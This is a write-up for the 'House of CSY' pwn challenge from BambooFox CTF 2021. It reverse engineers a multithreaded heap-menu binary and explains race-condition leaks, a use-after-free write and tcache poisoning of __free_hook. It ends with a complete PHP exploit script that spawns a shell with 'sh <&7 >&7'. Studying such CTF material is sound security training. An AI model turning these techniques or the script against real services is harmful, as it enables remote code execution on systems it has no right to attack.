# House of CSY - BambooFox CTF 2021 (pwn, 500p)

## Introduction
House of CSY is a pwn task.

An archive containing a binary and a Dockerfile is given. A script to solve the
proof of work is also provided.

The binary is a classic heap-menu challenge: it is possible to create, show and
delete rooms. It is also possible to add people in a specific room.

Connecting to the remote server and solving the proof of work spawns a new
instance with a random port.

## Reverse engineering
The binary creates a socket that listen on the TCP port `54321`. Every
connection is served with a new thread.

The program presents a heap menu with 4 options: create a room, show a room,
enter a room and delete a room.

### `room_new`
Location: `00000c4c`

This function creates a new room (with `malloc`)

The structure that holds a room is the following:
```c
struct room {
	char name[0x20];
	int  unk_0x20;
	char pad[4];
	char *users[5];
};
static_assert(0x50 == sizeof(struct room));
```

The `name` field can be up to `0x1F` bytes long. It is followed by a `NULL`
byte. The list of users are set to `NULL`.

Rooms are stored in a global variable that can contain up to `0x20` rooms.

Every other menu entries refuse room indexes that are over 5.

### `room_show`
Location: `00000dcf`

This function shows details of one of the first 5 rooms.

It prints the name of the room and the name of its (up to) 5 users

### `room_enter`
Location: `00000f0b`

This function adds a user to one of the first 5 rooms.

Users are stored in a buffer of size `0x20` allocated with `malloc`. The binary
reads `0x1F` bytes, and adds a `NULL` byte at the end.

### `room_del`
Location: `000010e2`


This function deletes one of the first 5 rooms.

It first deletes its users and sets the pointer to `NULL` (there is no room for
dangling pointers), and then sets the global room pointer to `NULL`.


## Vulnerabilities
This binary is vulnerable to multiple race conditions.
1. `room_new` can be used to leak memory
2. `room_enter` is susceptible to overwriting freed memory
3. `room_del` can cause a double free

The double free is too hard to pull off remotely. The two other vulnerabilities
are sufficient to solve this challenge.

### Memory leak in `room_new`
This race condition can be exploited with 2 threads (t1, t2):
- t1: create a new room, but do not specify a name
- t2: show room

t2 will show uninitialized memory. This can be used to leak a heap pointer by
massaging the allocation like this:
- t1: create room 0
- t1: create room 1
- t1: delete room 1
- t1: delete room 0

At this point, room 0's name contains a pointer to room 1
- t1: create a new room, do not specify name
- t2: show room 0

### Use-after-free write in `room_enter`
This race condition can be exploited with 2 threads (t1, t2):
- t1: create room 0
- t1: enter room 0, but do not specify a name
- t2: delete room 0

When t1 reads a name, it will overwrite freed memory.

This example will crash because entering room 0 will also add a `NULL` byte at
the end of the new resident's name. This happens because deleting the room will
set its `users` pointers to `NULL`.

```c
size = read(0, rooms[0]->users[u], 0x1F);
/* Deletion happens here */
rooms[0]->users[u][size] = 0;
```

## Exploitation
Unfortunately, the exploitation is not as straightforward as it seems.

Since the application uses threads, every threads use a different heap (that
is **not** managed by `brk`).

Each threads' heap is aligned on 24 bits. This means that the last 3 bytes are
zero. A `malloc_state` structure is present at the very start of each heap.

This unfortunately means the memory leak vulnerability will always leak only the
2 least significant bytes of the heap address.

By combining the two vulnerabilities, it is possible to partially overwrite a
tcache pointer, so that the next allocation points within the heap's
`malloc_state` structure (which is always at a fixed location).

The `next` and `next_free` pointers are particularly interesting because they
point (at least for the first thread) to `main_arena`, which lies in the libc's
`.bss` section.

This is reliably possible because of the `NULL` byte that prevented the
vulnerability from being exploited to leak a heap pointer earlier. This `NULL`
byte is overwritten by an other `NULL` byte that gets added at the end of the
resident's name.

The following actions are thus required to get a libc leak:
1. Allocate rooms and users to have a convenient free list
2. Use the UAF write to make the tcache point to `heap + 0x0890`
3. Use the memory leak to leak the content of `heap + 0x0890`

The "convenient free list" is described as:
```
+--------+     +--------+     +--------+
| user 1 | --> | victim | --> | user 2 | --> NULL
+--------+     +--------+     +--------+
                   ^
                   |
[enter room] ------+
```

And can be obtained with the following actions:
1. t1: Create 3 rooms
2. t1: Create a user ("user 1") in room 2
3. t1: Create a user ("user 2") in room 3
4. t1: Create a user ("victim") in room 1 (but do not input its name)
5. t2: Delete room 3
6. t2: Delete room 1
7. t2: Delete room 2
8. t2: Re-create room 1 to prevent the `NULL` pointer crash
9. t1: Give a name to the victim block

Once the libc pointer leaked, the rest of the exploitation is pretty
straightforward: reuse the same vulnerability to have a tcache pointer in
`__free_hook` to replace it with `system`.

This exploit uses `sh <&7 >&7` to spawn a shell on the 7th file descriptor
(which is used for the 4th thread). This results in `sh` and the application
fighting to get the input. Commands get executed half of the time on average.
This is enough to get the flag.

**Flag**: `flag{Actually_this_is_a_final_project_of_3_course_parallelprogramming_networkprogramming_softwaresecurity}`

## Appendices
### pwn.php
```php
#!/usr/bin/php
<?php // vim: filetype=php
require_once "/mnt/ctf/tools/pwn/phplib/hexdump.php";
require_once "/mnt/ctf/tools/pwn/phplib/tubes/Process.php";
require_once "/mnt/ctf/tools/pwn/phplib/tubes/Socket.php";

const MAIN_ARENA = 0x001E4C40;
const FREE_HOOK  = 0x001E75A8;
const SYSTEM     = 0x00052fd0;

define("PORT", 0  | ($argv[1] ?? 54321));
define("HOST", "" . ($argv[2] ?? "127.0.0.1"));

function motd(Tube $t)
{
	$t->expectLine(" ______     ______     __  __    ");
	$t->expectLine("/\  ___\   /\  ___\   /\ \_\ \   ");
	$t->expectLine("\ \ \____  \ \___  \  \ \____ \  ");
	$t->expectLine(" \ \_____\  \/\_____\  \/\_____\ ");
	$t->expectLine("  \/_____/   \/_____/   \/_____/ ");
	$t->expectLine("                                 ");
}

function connect(string $host, int $port) : Tube
{
	$t = new Socket(HOST, PORT);
	motd($t);
	return $t;
}

function menu(Tube $t)
{
	$t->expectLine("------ House Of CSY ------");
	$t->expectLine("| 1. Create a room       |");
	$t->expectLine("| 2. Show a room         |");
	$t->expectLine("| 3. Enter a room        |");
	$t->expectLine("| 4. Destruct a room     |");
	$t->expectLine("--------------------------");
	$t->expect("Choose> ");
}

function room_new(Tube $t) : Closure
{
	menu($t);
	$t->write("1\n");

	return function(string $name) use($t) : int {
		$t->expect("Room name: ");
		$t->write($name);

		$t->expect("Room created!!! Room id: ");
		return 0 | $t->readLine();
	};
}

function room_show(Tube $t, int $idx, int $count) : stdClass
{
	$ret = new stdClass;

	menu($t);
	$t->write("2\n");

	$t->expect("Input index: ");
	$t->write("$idx\n");

	$t->expect("Room ");
	$ret->room  = $t->readLine();
	$ret->users = [];

	$t->expectLine("Users in the room:");
	for($i = 0; $i < $count; $i++) {
		$t->expect("User ");
		$ret->users[] = $t->readLine();
	}

	return $ret;
}

function room_enter(Tube $t, int $idx) : Closure
{
	menu($t);
	$t->write("3\n");

	$t->expect("Which room do you want to enter: ");
	$t->write("$idx\n");

	return function(string $name) use($t) {
		$t->expect("What's your name: ");
		$t->write($name);

		$t->expectLine("Entered");
	};
}

function room_del(Tube $t) : Closure
{
	menu($t);
	$t->write("4\n");
	$t->expect("Which room do you want to destruct: ");

	return function(int $idx) use($t) {
		$t->write("$idx\n");

		$t->expect("Destructing...");
		$t->expectLine("Destructed");
	};
}


printf("[*] Create threads\n");
$ta = connect(HOST, PORT);
$tb = connect(HOST, PORT);
$tc = connect(HOST, PORT);
$td = connect(HOST, PORT);

/* Target tcache state
 * user1 -> victim -> user2 -> NULL
 *
 * We can allocated user1, race victim and allocate so user2 is where we want
 */
libc:
[$t1, $t2] = [$ta, $tb];

printf("[*] Create rooms\n");
$idx1 = room_new($t1)("room1");
$idx2 = room_new($t1)("room2");
$idx3 = room_new($t1)("room3");
printf("[%d, %d, %d]\n", $idx1, $idx2, $idx3);

room_enter($t1, $idx2)(str_repeat("1", 0x18));
room_enter($t1, $idx3)(str_repeat("2", 0x18));

printf("[*] Prepare race\n");
$f = room_enter($t2, $idx1);

// tcache 0x00007ffff00008d0
// user1  0x00007ffff0000c40 
// victim 0x00007ffff0000b20
// user2  0x00007ffff0000c70

printf("[*] Delete rooms\n");
room_del($t1)($idx3); // 0x20: user2 -> NULL
room_del($t1)($idx1); // 0x20: victim -> user2 -> NULL
room_del($t1)($idx2); // 0x20: user1 -> victim -> user2 -> NULL

printf("[*] Recreate room\n");
$idx4 = room_new($t1)("room4");
assert($idx1 === $idx4);
room_enter($t1, $idx4)(str_repeat("3", 0x18));

printf("[*] Corrupt tcache list\n");
$f("\x90\x08"); // partial overwrite

printf("[*] Leak libc\n");
room_enter($t1, $idx4)(str_repeat("4", 0x18));
$f = room_enter($t1, $idx4);

$room = room_show($t2, $idx4, 3);
$user = $room->users[2];
assert(6 === strlen($user));

$leak = str_pad($user, 8, "\x00");
$libc = unpack("Q", $leak)[1] - MAIN_ARENA;
printf("[+] libc: %X\n", $libc);
printf("\n");

assert(0 === ($libc >> 48));
assert(0 === ($libc & 0xFFF));

////////////////////////////////////////////////////////////////////////////////

rce:
[$t1, $t2] = [$tc, $td];

printf("[*] Create rooms\n");
$idx1 = room_new($t1)("room1");
$idx2 = room_new($t1)("room2");
$idx3 = room_new($t1)("room3");

room_enter($t1, $idx2)(str_repeat("1", 0x18));
room_enter($t1, $idx3)(str_repeat("2", 0x18));

printf("[*] Prepare race\n");
$f = room_enter($t2, $idx1);


printf("[*] Delete rooms\n");
room_del($t1)($idx3); // 0x20: user2 -> NULL
room_del($t1)($idx1); // 0x20: victim -> user2 -> NULL
room_del($t1)($idx2); // 0x20: user1 -> victim -> user2 -> NULL


printf("[*] Recreate room\n");
$idx4 = room_new($t1)("room4");
assert($idx1 === $idx4);
room_enter($t1, $idx4)(str_repeat("3", 0x18));

printf("[*] Corrupt tcache list\n");
$f(pack("Q", $libc + FREE_HOOK));

printf("[*] Replace __free_hook\n");
room_enter($t1, $idx4)(str_repeat("4", 0x18));
room_enter($t1, $idx4)(pack("Q", $libc + SYSTEM));
printf("%X\n", $libc + FREE_HOOK);

printf("[*] Call system\n");
$idx = room_new($t1)("sh <&7 >&7");
room_del($t1); //($idx);
$t1->write("$idx\n");

printf("[!] PIPE\n");
$t2->pipe();
```
